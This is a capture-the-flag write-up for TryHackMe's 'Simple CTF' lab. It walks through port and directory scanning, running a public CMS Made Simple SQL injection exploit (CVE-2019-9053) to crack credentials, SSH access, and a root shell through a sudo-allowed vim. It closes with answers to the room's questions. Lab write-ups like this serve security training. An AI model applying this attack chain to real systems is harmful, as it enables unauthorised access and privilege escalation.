# Tryhackme Simple CTF - Linux

- [Room](https://tryhackme.com/room/easyctf)

## Nmap

```
┌──(root💀kali)-[~]
└─# nmap -T5 -sC -sV -O -Pn -p- 10.10.61.2   
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-08 09:12 EDT
Nmap scan report for 10.10.61.2
Host is up (0.22s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.22.56
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Adtran 424RG FTTH gateway (86%), Linux 2.6.32 (86%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 333.81 seconds
```

## Gobuster

```
┌──(root💀kali)-[~]
└─# gobuster dir -u http://10.10.61.2/ --wildcard -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.61.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/08 09:30:20 Starting gobuster in directory enumeration mode
===============================================================
/simple               (Status: 301) [Size: 309] [--> http://10.10.61.2/simple/]
```

- We find a page using CMS made simple that has a cve. We can try this [exploit](https://www.exploit-db.com/exploits/46635)
- We take it in our kali `wget https://www.exploit-db.com/download/46635`
- `python 46635 -u http://10.10.61.2/simple/ --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt`  
![image](https://user-images.githubusercontent.com/96747355/167299774-d4b46f7f-8392-4ddb-997d-de10c0996705.png)  
- Once the credentials found we can login here http://10.10.61.2/simple/admin/login.php
![image](https://user-images.githubusercontent.com/96747355/167299425-f608f3c4-a573-4aaf-a69b-91bc528d0631.png)  
- **But** we can also try to check if the creds would work with ssh (Remember to specify the port in your ssh command because it is not on default 22 port)
- `ssh mitch@10.10.104.30 -p 2222`

## Privesc

- `sudo -l` we find out that vim is allowed
- We can do this trick [here](https://gtfobins.github.io/gtfobins/vim/#sudo) `sudo vim -c ':!/bin/bash'` I just changed it to get a bash shell
- It works  
![image](https://user-images.githubusercontent.com/96747355/167300375-766777d8-17d5-42a1-8352-554e580f7aeb.png)  

## Questions

- `How many services are running under port 1000?` Answer `2`
- `What is running on the higher port?` Answer `ssh`
- `What's the CVE you're using against the application?` Answer `CVE-2019-9053` reading the exploit we understand that the app is vulnerable to a time based SQL injection.
- `To what kind of vulnerability is the application vulnerable?` Answer `SQLi`
- `What's the password?` I will let you find this on your own
- `Where can you login with the details obtained?` Answer `ssh`
- `What's the user flag?` I will let you find this on your own. Hint: `cat user.txt`
- `Is there any other user in the home directory? What's its name?` We do an `ls /home` and we find the user `sunbath`
- `What can you leverage to spawn a privileged shell?` Answer `vim`
- `What's the root flag?` I will let you find this on your own. Hint: `cat /root/root.txt`
